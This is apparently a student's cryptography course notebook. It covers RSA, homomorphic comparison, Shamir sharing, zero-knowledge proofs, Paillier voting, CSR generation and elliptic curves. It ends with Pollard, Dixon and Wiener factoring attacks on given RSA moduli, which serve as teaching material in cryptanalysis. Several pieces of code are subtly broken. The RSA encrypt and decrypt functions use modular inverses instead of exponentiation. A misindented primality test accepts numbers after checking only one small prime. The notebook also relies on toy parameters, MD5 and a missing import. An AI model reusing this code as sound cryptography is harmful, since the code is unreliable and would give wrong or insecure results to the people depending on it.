# -*- coding: utf-8 -*-
"""Privacy_Notebook

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1f8G2Uth4fm3KJuhbFwwxjxBblU6cQlSB

### Week 1 - RSA Multiplications
"""

pip install pycryptodome

p=17
q=23
print("Choosen primes:p=" + str(p) + ", q=" + str(q))
n=p*q
print("n = p * q = " + str(n) + "\n")
phi=(p-1)*(q-1)
print("Euler's function [phi(n)]: " + str(phi))

def gcd(a, b):
    while b != 0:
        c = a % b
        a = b
        b = c
    return a

def modinv(a, m):
    for x in range(1, m):
        if (a * x) % m == 1:
            return x
    return None
    
def coprimes(a):
    l = []
    for x in range(2, a):
        if gcd(a, x) == 1 and modinv(x,phi) != None:
            l.append(x)
    for x in l:
        if x == modinv(x,phi):
            l.remove(x)
    return l

e=31
d=modinv(e,phi)
print("\nYour public key is a pair of numbers (e=" + str(e) + ", n=" + str(n) + ").")
print("Your private key is a pair of numbers (d=" + str(d) + ", n=" + str(n) + ").")
def encrypt(m):
    c = modinv(m**e, n)
    if c == None: print('No modular multiplicative inverse for block ' + str(m) + '.')
    return c
def decrypt(c):
    m = modinv(c**d, n)
    if m == None: print('No modular multiplicative inverse for block ' + str(c) + '.')
    return m

snum = 44
snum2 = 3
print()
print("Encrypt(", snum,") =", encrypt(snum))
print("Encrypt(" , snum2,") =", encrypt(snum2))
print("Multiply plaintexts:",snum, "*",snum2,"=",snum*snum2)
print("Multiply ciphertexts:",encrypt(snum), "*",encrypt(snum2),"=", encrypt(snum)*encrypt(snum2))
print()
print("Encrypt(",snum*snum2,") =",encrypt(snum*snum2))
print()
print("Result of decrypting",encrypt(snum*snum2),"and",encrypt(snum)*encrypt(snum2),"returns same result")
print("Decrypt(",encrypt(snum*snum2),") =",decrypt(encrypt(snum*snum2)))
print("Decrypt(",encrypt(snum)*encrypt(snum2),") =", decrypt(encrypt(snum)*encrypt(snum2)))

"""##Week 2 - Homomorphic cipher for millionare problem"""

#https://asecuritysite.com/encryption/hom_mill ----------- EXTRACTED FROM HERE
# 00 - 1 million
# 01 - 2 million
# 10 - 3 million
# 11 - 4 million

from random import randint

a_1 = 1
a_0 = 1       # Alice has 4 million

b_1 = 0
b_0 = 1       # Bob has 2 million


def inv(val):
  return(val ^ 1)
	
r1 =randint(1, 10)
r2= randint(1, 10)
r3 =randint(1, 10)
r4 =randint(1, 10)

q1 =randint(50000, 60000)
q2 =randint(50000, 60000)
q3 =randint(50000, 60000)
q4 =randint(50000, 60000)

p =randint(1000000, 2000000)

c_bit_a_0 =  q1 * p + 2*r1 +a_0
c_bit_a_1 =  q2 * p + 2*r2 +a_1 
c_bit_b_0 =  q3 * p + 2*r3 +b_0 
c_bit_b_1=  q4 * p + 2*r4 +b_1

# Truth table

g = c_bit_a_0*inv(c_bit_b_1)*inv(c_bit_b_0) + c_bit_a_1*inv(c_bit_b_1)  + c_bit_a_1*c_bit_a_0*inv(c_bit_b_0)

e = inv(c_bit_a_1)*inv(c_bit_a_0)*inv(c_bit_b_1)*inv(c_bit_b_0)+ \
inv(c_bit_a_1)*(c_bit_a_0)*inv(c_bit_b_1)*c_bit_b_0+ \
(c_bit_a_1)*(c_bit_a_0)*(c_bit_b_1)*(c_bit_b_0)+ \
(c_bit_a_1)*inv(c_bit_a_0)*(c_bit_b_1)*inv(c_bit_b_0)

l=inv(c_bit_a_1)*c_bit_b_1 + inv(c_bit_a_0)*c_bit_b_1*c_bit_b_0+ inv(c_bit_a_1)*inv(c_bit_a_0)*c_bit_b_0

			
print ("r values:\t",r1,r2,r3,r4)
print ("q values:\t",q1,q2,q3,q4)
print ("p value:\t",p)

print ("\nInput bits")
print ("---------------")
print ("a_1:\t",a_1, "\ta_0:\t",a_0)
print ("b_1:\t",b_1, "\tb_0:\t",b_0)

print ("\nCipher bits")
print( "---------------")
print ("c_a_1:\t",c_bit_a_1, "\tc_a_0:\t",c_bit_a_0)
print ("c_b_1:\t",c_bit_b_1, "\tc_b_0:\t",c_bit_b_0)

print ("\nCipher result")
print ("---------------")

#decrypt
result_greater = (g % p) % 2
result_equal = (e % p) % 2
result_less = (l % p) % 2

if(result_greater):
  print ("A is greater than B.")
if(result_equal):
  print ("A is equal to B.")
if(result_less):
  print ("A is less than B.")

"""##Week 3 - Samir secret sharing"""

from binascii import hexlify
from binascii import unhexlify
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.SecretSharing import Shamir

secret = "LAB WAS CLEANED!"
secret_hex=""
for c in secret:
    secret_hex += hex(ord(c))[2:]

t = 4
n = 8
print("Using %d shares and a threshold of %d. Secret: %s" % (n,t,secret))

shares = Shamir.split(t, n, int(secret_hex, 16))
for idx, share in shares:
  print("Share %d: %s" % (idx, hexlify(share)))


print("Reconstructed using 2 shares:  ", Shamir.combine(shares[0:2]))
print("Reconstructed using 4 shares:  ", Shamir.combine(shares[0:4]))


shares= [(1, bytes.fromhex('3fc19d1ec3452091825d36f555ace291')), 
 (2, bytes.fromhex('404c31e714824b6c7e43e1dd4b8ab189')), 
 (3, bytes.fromhex('9d67c656e7175e8a7fb5098b23d10255')), 
 (4,  bytes.fromhex('3c0c95915dd845648b41f9fe4a0492c1')), 
] 

print("Prev secret using 2 shares:  ", Shamir.combine(shares[0:2]))
print("Prev secret using 4 shares:  ", Shamir.combine(shares[0:4]))


# We make the first two shares equal
#shares[1]=shares[0]
#print("Reconstructed using 3 shares, but first 2 are the same:  ", Shamir.combine(shares[0:3]))
#print("Reconstructed using 3 different shares:  ", Shamir.combine(shares[1:4]))

"""##Week 4 - Zero Knowledge Proof"""

import random
import hashlib

def string2numeric_hash(text):
  return int(hashlib.md5(text.encode("utf-8")).hexdigest()[:8], 16)

smallprimes = (2,3,5,7,11,13,17,19,23,29,31,37,41,43,
               47,53,59,61,67,71,73,79,83,89,97)
p=97
g=13
x=5
v= 7#random.randint(3, 20)

print( 'g=',g)
print( 'x=',x, ' (the secret)')
print( 'v=',v, ' (random)')
print( '=====Alice computes=========')

y= (g**x) %p
t= (g**v) %p 

print( 't=',t)
print( 'y=',y)

c = (string2numeric_hash(str(g)+str(y)+str(t)))%p


print ('c=',c)

r= (v - (c*x) )%p

print( '==============')
print( 'Alice sends (c,r)=(',str(c),',',(r),')')

t1 = (g**r)%p
t2= (y**c)%p

val=(t1*t2)%p

print(t1,t2,val)

c2 = (string2numeric_hash(str(g)+str(y)+str(val)))%p

print( 'Bobs calc for g^r Â· y^c = ',val)
print('Hashed:',c2)
if (c==c2):
  print( "Alice has proven her ID")
else:
  print( "You are a fraud")

"""##Exam"""

import random
import sys

def ipow(a, b, n):
  A = a = a % n
  yield A
  t = 1
  while t <= b:
    t <<= 1
    # t = 2**k, and t > b
  t >>= 2  
  while t:
    A = (A * A) % n
    if t & b:
      A = (A * a) % n
    yield A
    t >>= 1

def rabin_miller_witness(test, possible):
  return 1 not in ipow(test, possible-1, possible)

smallprimes = (2,3,5,7,11,13,17,19,23,29,31,37,41,43,
               47,53,59,61,67,71,73,79,83,89,97)

def default_k(bits):
  return max(40, 2 * bits)

def is_probably_prime(possible, k=None):
  if possible == 1:
    return True
  if k is None:
    k = default_k(possible.bit_length())
  for i in smallprimes:
    if possible == i:
      return True
    if possible % i == 0:
      return False
    for i in range(int(k)):
      test = random.randrange(2, possible - 1) | 1
      if rabin_miller_witness(test, possible):
        return False
    return True

def generate_prime(bits, k=None):  
  assert bits >= 8

  if k is None:
    k = default_k(bits)

  while True:
    possible = random.randrange(2 ** (bits-1) + 1, 2 ** bits) | 1
    if is_probably_prime(possible, k):
      return possible

import math

def invmod(a, p, maxiter=1000000):
  if a == 0:
    raise ValueError('0 has no inverse mod %d' % p)
  r = a
  d = 1
  for i in range(min(p, maxiter)):
    d = ((p // r + 1) * d) % p
    r = (d * a) % p
    if r == 1:
      break
  else:
    raise ValueError('%d has no inverse mod %d' % (a, p))
  return d

def modpow(base, exponent, modulus):
  result = 1
  while exponent > 0:
    if exponent & 1 == 1:
      result = (result * base) % modulus
    exponent = exponent >> 1
    base = (base * base) % modulus
  return result

class PrivateKey(object):
  def __init__(self, p, q, n):
    self.l = (p-1) * (q-1)
    self.m = invmod(self.l, n)

  def __repr__(self):
    return '<PrivateKey: %s %s>' % (self.l, self.m)

class PublicKey(object):
  @classmethod
  def from_n(cls, n):
    return cls(n)

  def __init__(self, n):
    self.n = n
    self.n_sq = n * n
    self.g = n + 1

  def __repr__(self):
    return '<PublicKey: %s>' % self.n

def generate_keypair(bits):
  p = generate_prime(bits // 2)
  q = generate_prime(bits // 2)
  n = p * q
  return PrivateKey(p, q, n), PublicKey(n)

def encrypt(pub, plain):
  while True:
    r = generate_prime(round(math.log(pub.n, 2)))
    if r > 0 and r < pub.n:
      break
  x = pow(r, pub.n, pub.n_sq)
  cipher = (pow(pub.g, plain, pub.n_sq) * x) % pub.n_sq
  return cipher

def e_add(pub, a, b):
  return a * b % pub.n_sq

def e_add_const(pub, a, n):
  return a * modpow(pub.g, n, pub.n_sq) % pub.n_sq

def e_mul_const(pub, a, n):
  return modpow(a, n, pub.n_sq)

def decrypt(priv, pub, cipher):
  x = pow(cipher, priv.l, pub.n_sq) - 1
  plain = ((x // pub.n) * priv.m) % pub.n
  return plain



"""INSERT VOTES HERE"""
voteA = 0
voteB = 1
voteC = 1
voteD = 0
voteE = 0

privkey, pubkey = generate_keypair(256)

ciphertxtA = encrypt(pubkey,voteA)
ciphertxtB = encrypt(pubkey,voteB)
ciphertxtC = encrypt(pubkey,voteC)
ciphertxtD = encrypt(pubkey,voteD)
ciphertxtE = encrypt(pubkey,voteE)

sum1 = e_add(pubkey,ciphertxtA,ciphertxtB)
sum2 = e_add(pubkey,ciphertxtC,ciphertxtD)
sum3 = e_add(pubkey,sum1,sum2)
totalsum = e_add(pubkey,sum3,ciphertxtE)

result = decrypt(privkey,pubkey,totalsum)

if result > 3:
  print("Joe is chosen as our Chairman!!")
else:
  print("Insufficient votes for Chairman")

"""##Week 5 - ZKP applied to Diffie-Hellman"""

# zkp-dh: Zero-knowledge proof generator and verifier for one party to show
# to another that their Diffie-Hellman shared secret is correct.
# See the Camenisch and Stadler paper for procedural specifics on ZKP
# proof generation, such as knowledge of discrete logarithm.
# Lining Wang, June 2014
import random
import hashlib
import binascii
import sys
# DiffieHellman class enables construction of keys capable of performing
# D-H exchanges, and interactive proof of knowledge
class DiffieHellman:
  P = 101
  G = 51
  public=""
  def __init__(self,secret=0):
    if (secret==0):
      self.secret = random.randrange(1 << (self.G.bit_length()-1),self.G-1)
    else:
      self.secret = secret        
      self.public = pow(self.G, self.secret, self.P)
  
  # get shared secret: (g^b)^a mod p
  def get_shared_secret(self, remote_pub):
    return pow(remote_pub, self.secret, self.P)

  # Given the public key of B (remote_pub), shows that the shared secret
  # between A and B was generated by A.
  # Returns zero-knowledge proof of shared Diffie-Hellman secret between A & B.
  def prove_shared_secret(self, remote_pub):
    G = self.G; prover_pub = self.public; phi = self. P - 1;
    secret = self.get_shared_secret(remote_pub)
  
    # Random key in the group Z_q
    randKey = DiffieHellman() # random secret
    commit1 = randKey.public
    commit2 = randKey.get_shared_secret(remote_pub)
  
    # shift and hash
    concat = str(G) + str(prover_pub) + str(remote_pub) + str(secret) + str(commit1) + str(commit2)
    h = hashlib.md5()
    h.update(concat.encode("utf-8"))
    challenge = int(h.hexdigest(), 16)
    product = (self.secret * challenge) % phi
    response = (randKey.secret - product) % phi
    return (secret, challenge, response)

  # Verifies proof generated above. Verifier c is showing that
  # shared secret between A and B was generated by A.
  # returns 0 if if verification fails; returns shared secret otherwise
  def verify_shared_secret(self, prover_pub, remote_pub, secret, challenge, response):
    P = self.P; G = self.G ; public = self.public
    # g^r * (a's public key)^challenge
    commit1 = (pow(G, response, P) * pow(public, challenge, P)) % P
    # (b's public key)^response * (secret)^challenge
    commit2 = (pow(remote_pub, response, P) * pow(secret, challenge, P)) % P
    # Shift and hash
    hasher = hashlib.md5()
    concat = str(G) + str(prover_pub) + str(remote_pub) + str(secret) + str(commit1) + str(commit2)
    hasher.update(concat.encode("utf-8"))
    check = int(hasher.hexdigest(), 16)
    if challenge == check:
      return secret
    else:
      return 0
x=16
y=15
a = DiffieHellman(x)
b = DiffieHellman(y)
print ("G=",a.G)
print( "p=",a.P)
print( "x=",x)
print ("y=",y)
print ("\n============")
print( "a (pub,sec)=",a.public,a.secret)
print( "b (pub,sec)=",b.public,b.secret)
shared=a.get_shared_secret(b.public)
print( "Shared=",shared)
print( "\nNow Bob will generate the secret, a challenge and a response")
results = a.prove_shared_secret(b.public)
print( "(secret, challenge, response):",results)
val=a.verify_shared_secret(a.public, b.public, results[0], results[1], results[2])
print( "\nAlice now checks")
if (val==shared):
	print ("Bob has proven he knows x")
else:
	print( "Bob has not proven that he knows x")

import sys
import random
import hashlib
# DiffieHellman class enables construction of keys capable of performing
# D-H exchanges, and interactive proof of knowledge

class DiffieHellman:
  P = 101
  G = 51

  def __init__(self,secret=0):
    self.secret = random.randrange(1 << (self.G.bit_length() - 1), self.G - 1)
    self.public = pow(self.G, self.secret, self.P)

  def prove_shared_secret(self, remote_pub):
    G = self.G; prover_pub = self.public; phi = self. P - 1;
    secret = self.get_shared_secret(remote_pub)

    # Random key in the group Z_q
    randKey = DiffieHellman() # random secret
    commit1 = randKey.public
    commit2 = randKey.get_shared_secret(remote_pub)

    # shift and hash
    concat = str(G) + str(prover_pub) + str(remote_pub) + str(secret) + str(commit1) + str(commit2)
    h = hashlib.md5()
    h.update(concat.encode("utf-8"))
    challenge = int(h.hexdigest(), 16)
    product = (self.secret * challenge) % phi
    response = (randKey.secret - product) % phi

    return (secret, challenge, response)

  def get_shared_secret(self, remote_pub):
    return pow(remote_pub, self.secret, self.P)

  # Verifies proof generated above. Verifier c is showing that
  # shared secret between A and B was generated by A.
  # returns 0 if if verification fails; returns shared secret otherwise
  def verify_shared_secret(self, prover_pub, remote_pub, secret, challenge,response):
    P = self.P; G = self.G ; public = self.public

    # g^r * (a's public key)^challenge
    commit1 = (pow(G, response, P) * pow(public, challenge, P)) % P

    # (b's public key)^response * (secret)^challenge
    commit2 = (pow(remote_pub, response, P) * pow(secret, challenge, P)) % P

    # Shift and hash
    hasher = hashlib.md5()
    concat = str(G) + str(prover_pub) + str(remote_pub) + str(secret) + str(commit1) + str(commit2)
    hasher.update(concat.encode("utf-8"))
    check = int(hasher.hexdigest(), 16)

    if challenge == check:
      return secret
    else:
      return 0 
x=16
y=15


a = DiffieHellman(x)
b = DiffieHellman(y)

print("G=",a.G)
print("p=",a.P)
print("x=",x)
print("y=",y)
print("\n============")

print("a (pub,sec)=",a.public,a.secret)
print("b (pub,sec)=",b.public,b.secret)
shared=a.get_shared_secret(b.public)
print("Shared=",shared)
print("\nNow Bob will generate the secret, a challenge and a response")
results = a.prove_shared_secret(b.public)
print("(secret, challenge, response):",results)

val=a.verify_shared_secret(a.public, b.public, results[0], results[1], results[2])
print("\nAlice now checks...")
if (val==shared):
	print("Bob has proven he knows x")
else:
	print("Bob does not know x")

"""##Week 6 - ZKP applied to Fiat-Shamir"""

pip install libnum

import sys
import random
import hashlib
import libnum

def pickg(p):
  for x in range (1,p):
    rand = x
    exp=1
    next = rand % p
    
    while (next != 1 ):
      next = (next*rand) % p
      exp = exp+1
    
    if (exp==p-1):
      return rand

n=997

text="passw0rd"

g= 3

v = random.randint(1,n)
c = random.randint(1,n)

print("Password:\t",text)
x = int(hashlib.md5(text.encode()).hexdigest()[:8], 16) % n

g=pickg(n)

y= pow(g,x,n)

t = pow(g,v,n)

r = (v - c * x) 

if (r<0):
  Result = ( libnum.invmod(pow(g,-r,n),n) * pow(y,c,n))  % n
else:
  Result = ( pow(g,r,n) * pow(y,c,n))  % n

print('\n======Agreed parameters============')
print('P=',n,'\t(Prime number)')
print('G=',g,'\t(Generator)')

print('\n======The secret==================')
print('x=',x,'\t(Alice\'s secret)')

print('\n======Random values===============')
print('c=',c,'\t(Bob\'s random value)')
print('v=',v,'\t(Alice\'s random value)')

print('\n======Shared value===============')
print('g^x mod P=\t',y)
print('r=\t\t',r)

print('\n=========Results===================')
print('t=g**v % n =\t\t',t)
print('( (g**r) * (y**c) )=\t',Result)
if (t==Result):
  print('Alice has proven she knows password')
else:
  print('Alice has not proven she knows x')

"""##Week 7 - CSR"""

pip install pyopenssl

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
import OpenSSL.crypto

# Generate our key
key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
print("Generated key: ",key)
printkey =""
for i in range(0,1800,90):
  printkey += str(key.private_bytes(encoding=serialization.Encoding.PEM,
  format=serialization.PrivateFormat.TraditionalOpenSSL,
  encryption_algorithm=serialization.BestAvailableEncryption(b"passphrase"),))[i:i+90]
  printkey += '\n'
print(printkey)

# Generate a CSR
csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
# Provide various details about who we are.
    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
    x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
    x509.NameAttribute(NameOID.COMMON_NAME, u"mysite.com"),
])).add_extension(
    x509.SubjectAlternativeName([
        # Describe what sites we want this certificate for.
        x509.DNSName(u"mysite.com"),
        x509.DNSName(u"www.mysite.com"),
        x509.DNSName(u"subdomain.mysite.com"),
    ]),
    critical=False,
# Sign the CSR with our private key.
).sign(key, hashes.SHA256(), default_backend())
# Write our CSR out to disk.
print("Generated CSR: ",csr)
printcsr =""
for i in range(0,1200,90):
  printcsr += str(csr.public_bytes(serialization.Encoding.PEM))[i:i+90]
  printcsr += '\n'
print(printcsr)


req = load_certificate_request(FILETYPE_PEM, csr.public_bytes(serialization.Encoding.PEM))
pubkey = req.get_pubkey()
key_type = 'RSA' if pubkey.type() == OpenSSL.crypto.TYPE_RSA else 'DSA'

subject = req.get_subject()
components = dict(subject.get_components())
print("Common name:", components['CN'.encode()].decode())
print("Organisation:", components['O'.encode()].decode())
print("City/locality:", components['L'.encode()].decode())
print("State/province:", components['ST'.encode()].decode())
print("Country:", components['C'.encode()].decode())
print("Key algorithm:", key_type)
print("Key size:", pubkey.bits())

"""##Week 8 - Dataset using pandas"""

import pandas as pd
df = pd.read_csv("COVID19_open_line_list.csv", usecols = ['ID','age','sex','city','province','country'])

print(df.head(50),"\n")

# filtering data  
# displaying data only with age NOT NaN  
bool_series = pd.notnull(df["age"])  
data = df[bool_series]  
print(data.head(50),"\n")

for i in range(len(data)):
  try:
    if int(data["age"][i])>=35 and int(data["age"][i])<=45: # displaying data only with age in between 35 and 45 years old  
      bool_series[i] = True
    else:
      bool_series[i] = False
  except KeyError:   
    bool_series[i] = False
  except ValueError:
    bool_series[i] = False

data = data[bool_series]  
print(data.head(50),"\n")

"""##Week 9 - Exam"""

pip install libnum

def randomPoints(n=35):
  import sys
  import libnum
  
  # n is the number of points to generate
  a=0
  b=7
  p=37 # prime number
  x=3 # starting point
  
  z=(x**3 + a*x +b) % p
  if (libnum.has_sqrtmod(z,{p:1} )):
    y=next(libnum.sqrtmod(z,{p:1}))
  
  
  """print("a=",a)
  print("b=",b)
  print("p=",p)
  print("n=",n)
  print("x-point=",x)"""
    
  s=((3*x**2)+a) * libnum.invmod(2*y,p) 
  
  x1=(s**2-2*x) % p
  
  y1=((s*(x-x1))-y) % p
  
  x3=x1
  y3=y1
  x2=0
  y2=0
  counter=1
  
  for i in range(2, n+1):
      counter=counter+1
      if (counter>n): sys.exit()
  
      #print("%dP\t(%d,%d)" % (counter,x1,y1), end=' ')
      #if ((y1**2 % p) == ((x1**3+a*x1+b) %p)): print("  \tPoint is on curve")
  
      rtn=libnum.invmod(x1-x,p) 
      if (rtn==0): 
          #print("%dP=0" % (counter+1))
          counter=counter+2
          s=((3*x**2)+a) *  libnum.invmod(2*y,p) 
  
          x1=(s**2-2*x) % p
  
          y1=((s*(x-x1))-y) % p
          #print("%dP\t(%d,%d)" % (counter,x,y), end=' ')
          #if ((y**2 % p) == ((x**3+a*x+b) %p)): print("  \tPoint is on curve")
  
  
      else:   
          s=(y1-y)* rtn
  
          x2=(s**2-x1-x) % p
  
          y2=((s*(x1-x2)-y1)) % p
  
          x1=x2
          y1=y2
         
  #print("P\t(%d,%d)" % (x,y), end=' ')
  #print("%dP\t(%d,%d)" % (counter,x1,y1), end=' ')
  if ((y1**2 % p) == ((x1**3+a*x1+b) %p)) and ((y**2 % p) == ((x**3+a*x+b) %p)):
    #Point is on curve
    return (x1,y1)
  else:
      print("  \tPoint is not on curve")
      sys.exit()
  
  return

import sys
import random
import hashlib
import numpy
import libnum
 
n=997
#a=0
#b=7
#p=37 # prime number
 
text="this is my password"
x = int(hashlib.md5(text.encode()).hexdigest()[:8], 16) % n
 
G = randomPoints(10)
H = randomPoints(16)
 
"""xG = randomPoints(x)
xH = randomPoints(x)"""
 
xG = x * numpy.array(G)
xH = x * numpy.array(H)
 
v = random.randint(1,n)
 
vG = v * numpy.array(G)
vH = v * numpy.array(H)
 
"""z=(x**3 + a*x +b) % p
if (libnum.has_sqrtmod(z,{p:1} )):
  y=next(libnum.sqrtmod(z,{p:1}))
 
if ((y**2 % p) == ((x**3+a*x+b) %p)): print("  \tPoint is on curve")
else:
    print("  \tPoint is not on curve")"""
 
concat = str(xG)+str(xH)+str(vG)+str(vH)
c = int(hashlib.md5(concat.encode()).hexdigest()[:8], 16) % n
 
r = (v - c * x) 
 
rG = r * numpy.array(G)
rH = r * numpy.array(H)
proofG = rG+c*xG
proofH = rH+c*xH
 
Result = False
for i in range(len(proofG)):
  if (proofG[i] == vG[i]) and (proofH[i] == vH[i]):
    Result = True
  else:
    Result = False
 
print('\n======Parameters============')
print('P=',n,'\t\t(Prime number)')
print('G=',G,'\t(Point of the curve)')
print('H=',H,'\t(Point of the curve)')
print('v=',v,'\t\t(Victor\'s random value)')
 
print('\n======The secret==================')
print("Password:",text)
print('x=',x,'\t(Peggy\'s secret)')
 
print('\n======Challenge===============')
print('c=',c,'\t(Victor\'s computed challenge)')
 
print('\n======Response===============')
print('r=\t',r)
 
print('\n=========Results===================')
print('vG =\t',vG,'\t(Original value)')
print('rG+c(xG) =',proofG,'(Computed value)')
 
print('vH =\t',vH,'\t(Original value)')
print('rG+c(xG) =',proofH,'\t(Computed value)')
 
 
if (Result):
  print("\n",'Peggy has proven she knows password')
else:
  print("\n",'Peggy has not proven she knows x')

"""## Network Security Assignment"""

pip install pycryptodome libnum owiener

from Crypto.Util.number import long_to_bytes
from typing import Tuple, Iterator, Iterable, Optional
from decimal import Decimal, getcontext
import libnum
import math 
import sympy 
import time 

# input value     
#e = 13093328595385160044165980293174831781402910433996829686049849079194139027017437963020433409654254598967784284273088466083085543342666840110989310331142491498938291460305295086828226541498060829091531200764423401195922683471453468703721689465669372303425266741388904901165666303328872760703619023190687995422691546642616899901532563750227860076575848959768161075100460255012577625565123868435724583614883870330213257657190685096528432418456665538846807560061020585626974490286664652793908833669424000276680931369139404546215686214432257377137376327944301552319505561125394344205596939320029134879444106807878438488137
#N = 21986209349522598669810906865768024040510874833876982838576681331542309207547008218894072567095416373659497230133396569323359898371317789548133481802145312769895831863123149387038220821712773786960781756311664121510622866921173866500595409454901147010013471749478924826426822441873737331716495921635931883569963555187083485598206980529116827877795567026250074202265927360532074462873436662506582235080339443933241625359591476428997279199451820908821582619548286654231931531356251085596993523325271292315727665008270293782837742921563562663832006966733277787971278021005846570498685386487009374677868911522765753502223
#e = 65537
#N = 24430436836352483797063096106414774550335403158860524990373856944254297586018983298705492233654830523199692736514219239319146510300625339876324647894404893431924815784960576423322270642064447439532880084271906506181596791330255472317736274838975886982878636272375371266076163692482358755032762905350584467818322896256697824686362875462689754439034305568485764372282041358336076968265549938271297558180529807346415680592340188076635410423523198461463168140415659131710799290510682225326203262832075315314659506065014839527357257670962979561415126272979988642044180466409976304796211964778255235614585976098809592350027 
e = 4540739216185503944360317693727598425914265679950045193021325112310705634291619065008907799345804742158053789146296680446894494207857215362393461454740251861270045084357114733204905034770917891701793191139362007652012678514584941575186023625310517580446149923208688962903396756745069246710893893015854244396440602337384016923965920177062914455924380937065037932267969029224822211730100507762697227846127311177385930201779337513938673664269014723153905166514932029992336846458567909977502925990713226059794678425101890459773253915812357018757128150035920553537530136211737469309110690361713502937223534374706564266353
N = 11504527348504158734037780170377498878712004214260381608730500717991815279122806648544220211648205780154761466805683032692581326833774139612636039191040833561873869035670800926010549835734364594410395476885067722861580093389878040520372281552748236896416214306849077757975842715196976800713818245047806206651294270657799988276627708411462924090113406327688546733972246647011570643506334873954567135880261896080553702646403928357768206828842771519038916167325592923329250827223365152756794305129647653055443711932408387687334586308353275284499524570044721152926963826516772537698976072032292400126788019940915306214671
#e = 65537
#N = 21991232899020757667180708939003545471279700034913931387275370649484106213493746354134516938874683722532376522428739266831139982942037647489613088565834625396270116948482205233937311403693804017272705867342159850843308530001872731667565741346582215077293242970006473486509965365929587251903494207313928176058515727281298368666934123057519040352255360265190524877179165787262999219352376695956654193963802488345737739750543388868502221204357840956405751039414535031641247236228671392078875980200356717694181270438688970492725419513292742560009022330977944092829578706789218989389932864305999884300269715051661053097943

p = ""
q = ""
n = ""
c = ""
d = ""
res = ""
print ("N: ",N)
print ("e: ",e)


#POLLARD'S P-1 ATTACK 
         
def pollardp(n): 
   
    # initial base and exponent 
    a = 2
    i = 2
    timeout = time.time() + 5
    while(True): 
   
        a = pow(a,i,n) 
        d = math.gcd((a-1), n) 
        if (d > 1) or time.time() > timeout: 
          return d 
          break
        i += 1


#DIXON'S FACTORIZATION ATTACK
 
def test_pair(a_pair, n, p_list):
  n1, n2 = a_pair
  result = True
  n1_padded = padded_possible(n1 * n1 % n, p_list)
  n2_padded = padded_possible(n2 * n2 % n, p_list)
  for i in range(len(p_list)):
    if (n1_padded[i][1] + n2_padded[i][1]) & 1:
      result = False
      break
  return result
 
def is_possible(n, p_list):
  result = False
  for a_prime in p_list:
    d, r = divmod(n, a_prime)
    while r == 0:
      if d == 1:
        result = True
        break
      n = d
      d, r = divmod(n, a_prime)
    if result == True:
      break
        
  return result
 
def get_factors(a_pair, n, p_list):
  n1, n2 = a_pair
  d1 = n1 * n2 % n
  n1_padded = padded_possible(n1 * n1 % n, p_list)
  n2_padded = padded_possible(n2 * n2 % n, p_list)
  comb = [(n1_padded[i][0], (n1_padded[i][1] + n2_padded[i][1]) // 2) for i in range(len(p_list))]
  d2 = 1
  for a_pair_2 in comb:
    d2 *= a_pair_2[0]**a_pair_2[1]
  f1 = gcd(d1 + d2, n)
  f2 = n // f1  
  return f1, f2
 
def padded_possible(n, p_list):
  result = []
  for a_prime in p_list:
    count = 0
    d, r = divmod(n, a_prime)      
    while r == 0:
      count += 1
      n = d
      d, r = divmod(n, a_prime)
    result.append((a_prime, count))   
  return result
 
def dixon_algorithm(n, starting_number, count):
  p_list, possibles, test_num, i = (2, 3, 5, 7), [], starting_number, 0
    
  while i < count:
    temp = (test_num * test_num) % n
    if is_possible(temp, p_list):
      possibles.append(test_num)
      i += 1
    test_num += 1
    
  pairs = [(possibles[i], possibles[j]) for i in range(1, count) for j in range(i)]
  goods = [a_pair for a_pair in pairs if test_pair(a_pair, n, p_list)]
  goods_keepers =[a_good for a_good in goods if get_factors(a_good, n, p_list)[0] != 1 and get_factors(a_good, n, p_list)[0] != n]
 
  if len(goods_keepers) == 0:
    result = 'No solution'
  else:
    result = get_factors(goods_keepers[0], n, p_list)
    
  return result


#WIENER'S ATTACK

def factor_n(n, phi):
    # set hih enough precision for decimals
    getcontext().prec = len(str(n)) + 100
    p_plus_q = n + 1 - phi
    delta = Decimal((p_plus_q)**2 - 4*n)
    sqrt_d = int(delta.sqrt())
    p = (p_plus_q + sqrt_d) // 2
    q = (p_plus_q - sqrt_d) // 2
    assert p * q == n, "something went wrong"
    return(p, q)

def isqrt(n: int) -> int:
    """
    ref: https://en.wikipedia.org/wiki/Integer_square_root
    >>> isqrt(289)
    17
    >>> isqrt(2)
    1
    >>> isqrt(1000000 ** 2)
    1000000
    """
    if n == 0:
        return 0
    # ref: https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Rough_estimation
    x = 2 ** ((n.bit_length() + 1) // 2)
    while True:
        y = (x + n // x) // 2
        if y >= x:
            return x
        x = y

def is_perfect_square(n: int) -> bool:
    """
    ref: http://d.hatena.ne.jp/hnw/20140503
    ref: https://github.com/AlexeiSheplyakov/gmp.pkg/blob/master/mpn/generic/perfsqr.c
    >>> is_perfect_square(100)
    True
    >>> is_perfect_square(2000000000000000000000000000 ** 2)
    True
    >>> is_perfect_square(2000000000000000000000000000 ** 2 + 1)
    False
    """
